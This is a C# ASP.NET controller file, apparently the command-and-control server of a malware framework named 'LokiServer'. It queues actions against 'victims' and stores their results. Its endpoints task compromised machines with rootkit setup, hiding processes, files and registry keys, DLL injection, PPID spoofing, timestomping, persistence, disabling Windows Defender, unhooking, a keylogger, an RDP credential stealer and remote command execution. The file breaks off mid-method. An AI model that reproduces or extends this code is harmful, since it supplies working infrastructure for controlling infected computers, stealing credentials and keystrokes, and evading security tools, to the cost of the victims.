using System;
using System.Data.SQLite;
using Microsoft.AspNetCore.Mvc;
using LokiServer;
using Microsoft.Extensions.Hosting;

namespace LokiServer.Controllers
{

    public class Request
    {
        public string id { get; set; }
    }

    public class victimRequest
    {
        public string victimID { get; set; }
    }

    public class DoRequest
    {
        public string id { get; set; }
        public string actionID { get; set; }
    }

    public class HideRegistryRequest
    {
        public string id { get; set; }
        public string registry { get; set; }
    }

    public class ReadFileRequest
    {
        public string id { get; set; }
        public string path { get; set; }
    }

    public class ListProcessesRequest
    {
        public string id { get; set; }
    }

    public class FolderContentRequest
    {
        public string id { get; set; }
        public string path { get; set; }
    }

    public class DownloadFileRequest
    {
        public string id { get; set; }
        public string filePath { get; set; }
        public string url { get; set; }
    }

    public class UploadFileRequest
    {
        public string id { get; set; }
        public string filePath { get; set; }
    }

    public class ExecuteCommandRequest
    {
        public string id { get; set; }
        public string command { get; set; }
    }

    public class InitRootkitRequest {        
        public string id { get; set; }
    }


    public class ExecuteAsAdminRequest
    {
        public string id { get; set; }
        public string exePath { get; set; }
    }

    public class HideProcessRequest
    {
        public string id { get; set; }
        public string processName { get; set; }
    }

    public class HideDirectoryRequest
    {
        public string id { get; set; }
        public string path { get; set; }
    }

    public class OutputEnumerateRequest
    {
        public string id { get; set; }
        public string result { get; set; }
    }

    public class DLLInjectionRequest
    {
        public string id { get; set; }
        public string processName { get; set; }
        public string dllPath { get; set; }
    }

    public class CreateTaskRequest
    {
        public string id { get; set; }
        public string taskName { get; set; }
        public string parameters { get; set; }
        public string command { get; set; }
        public string interval { get; set; }
    }

    public class KeyloggerRequest
    {
        public string id { get; set; }
    }

    public class KeyResultRequest
    {
        public string id { get; set; }
        public string result { get; set; }
    }

    public class RDPStealerRequest
    {
        public string id { get; set; }
    }

    public class RDPStealerResultRequest
    {
        public string id { get; set; }
        public string result { get; set; }
    }

    public class OutputRDPRequest
    {
        public string id { get; set; }
        public string result { get; set; }
    }

    public class SecurityRequest
    {
        public string id { get; set; }
    }

    public class SecurityResultRequest
    {
        public string id { get; set; }
        public string result { get; set; }
    }

    public class TimeStompingRequest
    {
        public string id { get; set; }
        public string originalPath { get; set; }
        public string destPath { get; set; }
    }

    public class FileHiderRequest
    {
        public string id { get; set; }
        public string filePath { get; set; }
        public string destPath { get; set; }
        public string adsName { get; set; }

    }

    public class PersistenceRequest
    {
        public string id { get; set; }
        public string path { get; set; }
        public string name { get; set; }
    }

    public class PPIDSpoofingRequest 
    {
        public string id { get; set; }
        public string process { get; set; }
        public string path { get; set; }
    }

    public class InstallAsServiceRequest
    {
        public string id { get; set; }
        public string path { get; set; }
        public string name { get; set; }
    }

    public class UnhookRequest
    {
        public string id { get; set; }
        public string process{ get; set; }
    }

    [ApiController]
    [Route("[controller]")]
    public class ActionController : Controller
    {
        [HttpPost]
        public string Post([FromBody] Request id)
        {
            string host = Request.Host.Value;
            string XAppTimestamp = Request.Headers["X-App-Timestamp"];
            string XAppSignature = Request.Headers["X-App-Signature"];
            string url = "/Action";
            if (Utils.validateAPIRequest(XAppTimestamp, XAppSignature, url, Request.Method))
            {
                //string decryptedID = Utils.XOR(id.id, "S12Secret");
                SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
                conn.Open();
                string query = "SELECT * FROM Action WHERE VictimID = @VictimID ORDER BY ID DESC LIMIT 1";

                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                {
                    cmd.Parameters.AddWithValue("@VictimID", id.id);
                    using SQLiteDataReader reader = cmd.ExecuteReader();
                    if (reader.Read())
                    {
                        string actionID = reader.GetInt32(reader.GetOrdinal("ActionID")).ToString();
                        string action = reader.GetInt32(reader.GetOrdinal("ID")).ToString();
                        return actionID + "," + action;
                    }
                }
            }
            return "";
        }

        [HttpPost]
        [Route("TimeStomping")]
        // action 0
        public string TimeStomping([FromBody] TimeStompingRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/TimeStomping";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 0, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "srcFile=" + request.originalPath + ",dstFile=" + request.destPath);
                cmd.ExecuteNonQuery();
                return "Time stomping request sent";
            }
        }

        [HttpPost]
        [Route("DownloadFile")]
        // action 15
        public string DownloadFile([FromBody] DownloadFileRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/DownloadFile";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 15, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "url=" + request.url + ",filePath=" + request.filePath);
                cmd.ExecuteNonQuery();
                return "Download file request sent";
            }
        }

        [HttpPost]
        [Route("Processes")]
        public string ListProcesses([FromBody] ListProcessesRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Processes";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 2, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "");
                cmd.ExecuteNonQuery();
                return "List processes request sent";
            }
        }

        [HttpPost]
        [Route("ExecuteAsAdmin")]
        // action 13
        public string ExecuteAsAdmin([FromBody] ExecuteAsAdminRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/ExecuteAsAdmin";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 13, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "process=" + request.exePath);
                cmd.ExecuteNonQuery();
                return "Execute as admin request sent";
            }
        }

        [HttpPost]
        [Route("UploadFile")]
        // insert into output 
        public string UploadFile([FromBody] UploadFileRequest request)
        {            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Output (VictimID, ActionID ,Output) VALUES (@VictimID, 16 ,@Output)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@Output", request.filePath);
                cmd.ExecuteNonQuery();
                // get last inserted id
                query = "SELECT last_insert_rowid()";
                using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                {
                    using (SQLiteDataReader reader = cmd2.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            string outputID = reader.GetInt32(0).ToString();
                            query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 16, @DateNow ,@Parameters)";
                            using (SQLiteCommand cmd3 = new SQLiteCommand(query, conn))
                            {
                                cmd3.Parameters.AddWithValue("@VictimID", request.id);
                                cmd3.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                                cmd3.Parameters.AddWithValue("@Parameters", "outputID=" + request.id + "filePath=" + request.filePath);
                                cmd3.ExecuteNonQuery();
                                return "Upload file request sent";
                            }
                        }
                    }
                }
            }
            return "";
        }


        [HttpPost]
        [Route("DLLInjection")]
        // action 1
        public string DLLInjection([FromBody] DLLInjectionRequest request)
        {            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 1, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "process=" + request.processName + ",dllPath=" + request.dllPath);
                cmd.ExecuteNonQuery();
                return "DLL injection request sent";
            }
        }

        
        [HttpPost("Rootkit")]
        // action 19
        public string InitRootkit([FromBody] InitRootkitRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Rootkit";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 19, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "");
                cmd.ExecuteNonQuery();
                return "Rootkit request sent";
            }
        }

        [HttpPost("HideProcess")]
        // action 20
        public string HideProcess([FromBody] HideProcessRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/HidePrsocess";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 20, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "process=" + request.processName);
                cmd.ExecuteNonQuery();
                return "Hide process request sent";
            }
        }

        [HttpPost("HideDirectory")]
        // action 21
        public string HideDirectory([FromBody] HideDirectoryRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/HideDirectory";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 21, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "path=" + request.path);
                cmd.ExecuteNonQuery();
                return "Hide directory request sent";
            }
        }

        [HttpPost("HideFile")]
        // action 4
        public string HideFile([FromBody] FileHiderRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/HideFile";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 4, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "srcFile=" + request.filePath + ",dstFile=" + request.destPath + ",adsName=" + request.adsName);
                cmd.ExecuteNonQuery();
                return "Hide file request sent";
            }
        }

        [HttpPost("UnhideFile")]
        // action 5
        public string UnhideFile([FromBody] FileHiderRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/UnhideFile";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 5, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "srcFile=" + request.filePath + ",dstFile=" + request.destPath + ",adsName=" + request.adsName);
                cmd.ExecuteNonQuery();
                return "Unhide file request sent";
            }
        }

        [HttpPost("Persistence")]
        // action 6
        public string Persistence([FromBody] PersistenceRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Persistence";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 6, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "exe=" + request.path + ",name=" + request.name);
                cmd.ExecuteNonQuery();
                return "Persistence request sent";
            }
        }

        [HttpPost("PSpoofing")]
        // action 10
        public string PPIDSpoofing([FromBody] PPIDSpoofingRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/PPIDSpoofing";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 10, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "processToSpoof=" + request.process + ",exeToExecute=" + request.path);
                cmd.ExecuteNonQuery();
                return "PPID spoofing request sent";
            }
        }

        [HttpPost("Service")]
        // action 11
        public string InstallAsService([FromBody] InstallAsServiceRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Service";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 11, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "servicePath=" + request.path + ",serviceName=" + request.name);
                cmd.ExecuteNonQuery();
                return "Service request sent";
            }
        }

        [HttpPost("Unhook")]
        // action 14
        public string Unhook([FromBody] UnhookRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Unhook";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 14, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "process=" + request.process);
                cmd.ExecuteNonQuery();
                return "Unhook request sent";
            }
        }

        [HttpPost("WinDef")]
        // action 3
        public string WinDef([FromBody] Request request)
        {
            string host = Request.Host.Value;
            string url = "/Action/WinDef";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 3, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "");
                cmd.ExecuteNonQuery();
                return "Windows defender request sent";
            }
        }



        [HttpPost("HideRegistry")]
        // action 22
        public string HideRegistry([FromBody] HideRegistryRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/HideRegistry";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 22, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "registry=" + request.registry);
                cmd.ExecuteNonQuery();
                return "Hide registry request sent";
            }
        }

        [HttpPost("ExecuteCommand")]
        public string ExecuteCommand([FromBody] ExecuteCommandRequest request)
        {
            // action 23
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 23, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "command=" + request.command);
                cmd.ExecuteNonQuery();
                return "Execute command request sent";
            }
        }



        [HttpPost("isInstalled")]
        public string isInstalled([FromBody] Request request)
        {
            string host = Request.Host.Value;
            string url = "/Action/isInstalled";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT * FROM Output WHERE VictimID = @VictimID AND ActionID = 19 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        string output = reader["Output"].ToString();
                        if (output == "active")
                        {
                            return "true";
                        }
                    }
                }
            }
            return "false";
        }

        [HttpPost("Enum")]
        // action 24
        public string Enum([FromBody] Request request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Enum";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 24, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "");
                cmd.ExecuteNonQuery();
                return "Enum request sent";
            }
        }


        [HttpPost("ActiveRootkit")]
        public void ActiveRootkit([FromBody] Request request)
        {
            string host = Request.Host.Value;
            string url = "/Action/ActiveRootkit";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Output (VictimID, ActionID ,Output) VALUES (@VictimID, 19 ,@Output)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@Output", "active");                
                cmd.ExecuteNonQuery();
            }
        }

        [HttpPost("OutputEnumerate")]
        public void OutputEnumerate([FromBody] OutputEnumerateRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/OutputEnumerate";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Output (VictimID, ActionID ,Output) VALUES (@VictimID, 24 ,@Output)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@Output", request.result);                
                cmd.ExecuteNonQuery();
            }
        }

        [HttpPost("EnumResult")]
        public IActionResult EnumResult([FromBody] Request request)
        {
            string host = Request.Host.Value;
            string url = "/Action/EnumResult";

            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT * FROM Output WHERE VictimID = @VictimID AND ActionID = 24 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        string output = reader["Output"].ToString();
                        var result = new { output = output };
                        return Json(result);
                    }
                }
            }
            return Ok("");
        }

        [HttpPost("CreateTask")]
        // action 25
        public string CreateTask([FromBody] CreateTaskRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/CreateTask";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 25, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "taskName=" + request.taskName + ",parameters=" + request.parameters + ",command=" + request.command + ",interval=" + request.interval);
                cmd.ExecuteNonQuery();
                return "Create task request sent";
            }
        }

        [HttpPost("Keylogger")]
        // action 26
        public JsonResult Keylogger([FromBody] KeyloggerRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Keylogger";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            // check if keylogger is already running
            string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = 26 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        // READ LAST KEYLOGGER ACTION IN OUTPUT TABLE
                        query = "SELECT * FROM Output WHERE VictimID = @VictimID AND ActionID = 26 ORDER BY ID DESC LIMIT 10";
                        using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                        {
                            cmd2.Parameters.AddWithValue("@VictimID", request.id);
                            using (SQLiteDataReader reader2 = cmd2.ExecuteReader())
                            {
                                if (reader2.HasRows)
                                {
                                    List<string> outputs = new List<string>();
                                    while (reader2.Read())
                                    {
                                        string output = reader2["Output"].ToString();
                                        outputs.Add(output);
                                    }
                                    return Json(outputs);
                                }
                                else
                                {
                                    return Json("No results yet");
                                }
                            }
                        }
                        //return Json("Keylogger OK");
                    }
                    else
                    {
                        query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 26, @DateNow ,@Parameters)";
                        using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                        {
                            cmd2.Parameters.AddWithValue("@VictimID", request.id);
                            cmd2.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                            cmd2.Parameters.AddWithValue("@Parameters", "");
                            cmd2.ExecuteNonQuery();
                        }
                        return Json("Keylogger NO");
                    }
                }
            }
        }

        [HttpPost("RDPStealer")]
        // acción 27
        public JsonResult RDPStealer([FromBody] RDPStealerRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/RDPStealer";

            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = 27 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        query = "SELECT * FROM Output WHERE VictimID = @VictimID AND ActionID = 27 ORDER BY ID DESC LIMIT 10";
                        using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                        {
                            cmd2.Parameters.AddWithValue("@VictimID", request.id);
                            using (SQLiteDataReader reader2 = cmd2.ExecuteReader())
                            {
                                if (reader2.HasRows)
                                {
                                    List<string> outputs = new List<string>();
                                    while (reader2.Read())
                                    {
                                        string output = reader2["Output"].ToString();
                                        outputs.Add(output);
                                    }
                                    return Json(outputs);
                                }
                                else
                                {
                                    return Json("No results yet");
                                }
                            }
                        }
                    }
                    else
                    {
                        query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 27, @DateNow ,@Parameters)";
                        using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                        {
                            cmd2.Parameters.AddWithValue("@VictimID", request.id);
                            cmd2.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                            cmd2.Parameters.AddWithValue("@Parameters", "");
                            cmd2.ExecuteNonQuery();
                        }
                        return Json("RDP Stealer NO");
                    }
                }
            }
        }

        [HttpPost("Security")]
        // action 28
        public JsonResult Security([FromBody] SecurityRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/Security";

            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = 28 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        query = "SELECT * FROM Output WHERE VictimID = @VictimID AND ActionID = 28 ORDER BY ID DESC LIMIT 1";
                        using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                        {
                            cmd2.Parameters.AddWithValue("@VictimID", request.id);
                            using (SQLiteDataReader reader2 = cmd2.ExecuteReader())
                            {
                                if (reader2.HasRows)
                                {
                                    List<string> outputs = new List<string>();
                                    while (reader2.Read())
                                    {
                                        string output = reader2["Output"].ToString();
                                        outputs.Add(output);
                                    }
                                    return Json(outputs);
                                }
                                else
                                {
                                    return Json("No results yet");
                                }
                            }
                        }
                    }
                    else
                    {
                        query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 28, @DateNow ,@Parameters)";
                        using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                        {
                            cmd2.Parameters.AddWithValue("@VictimID", request.id);
                            cmd2.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                            cmd2.Parameters.AddWithValue("@Parameters", "");
                            cmd2.ExecuteNonQuery();
                        }
                        return Json("Security NO");
                    }
                }
            }
        }

        [HttpPost("SecurityResult")]
        public void SecurityResult([FromBody] SecurityResultRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Output (VictimID, ActionID ,Output) VALUES (@VictimID, 28 ,@Output)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@Output", request.result);
                cmd.ExecuteNonQuery();
            }
        }

        [HttpPost("OutputRDP")]
        public void OutputRDP([FromBody] OutputRDPRequest request)
        {
            string host = Request.Host.Value;
            string url = "/Action/OutputRDP";

            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Output (VictimID, ActionID ,Output) VALUES (@VictimID, 27 ,@Output)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@Output", request.result);
                cmd.ExecuteNonQuery();
            }
        }

        [HttpPost("RDPStatus")]
        public string RDPStatus([FromBody] Request request)
        {
            string host = Request.Host.Value;
            string url = "/Action/RDPStatus";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = 27 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        return "true";
                    }
                }
            }
            return "false";
        }


        [HttpPost("LoggerStatus")]
        public string LoggerStatus([FromBody] Request request)
        {
            string host = Request.Host.Value;
            string url = "/Action/LoggerStatus";
            
